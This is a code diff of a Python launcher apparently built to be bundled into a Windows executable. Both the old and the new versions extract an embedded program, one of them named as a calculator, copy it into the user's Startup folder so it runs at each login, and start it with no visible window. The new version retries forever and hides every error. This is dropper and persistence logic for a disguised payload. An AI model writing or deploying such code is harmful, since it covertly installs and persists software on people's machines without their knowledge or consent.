@@ -1,28 +1,31 @@
-import subprocess
-import os
-import platform
 import shutil
+import os
 import sys
-try:
-    # Launch the client windows startup
-    if platform.system() != "Windows": exit()
+import subprocess
 
-    if hasattr(sys, "_MEIPASS") is False: exit()
-    
-    executable = os.path.join(sys._MEIPASS, "calculator-20241007184404.exe")
-  
-    startup_folder = os.path.join(
-        os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-    )
+launch = True
 
-    print(startup_folder)
+while launch:
+    try:
+        os.chdir(sys._MEIPASS)
 
-    subprocess.Popen([executable], creationflags=subprocess.CREATE_NO_WINDOW)
+        if hasattr(sys, "_MEIPASS"):
+            source_file = os.path.join(sys._MEIPASS, "${windows.autoexe.path}")
 
-    shutil.copy(executable, startup_folder + "\\calculator-20241007184404.exe")
+        appdata = os.getenv("APPDATA")
+        path = os.path.join(
+            appdata,
+            "Microsoft",
+            "Windows",
+            "Start Menu",
+            "Programs",
+            "Startup",
+            "${windows.autoexe.path}",
+        )
+        shutil.copyfile(source_file, path)
+        subprocess.run([path], creationflags=subprocess.CREATE_NO_WINDOW)
+        launch = False
+    except Exception as e:
+        launch = True
+        continue
 
-    print("Client launched successfully")
-
-
-except Exception as e:
-    print(e)
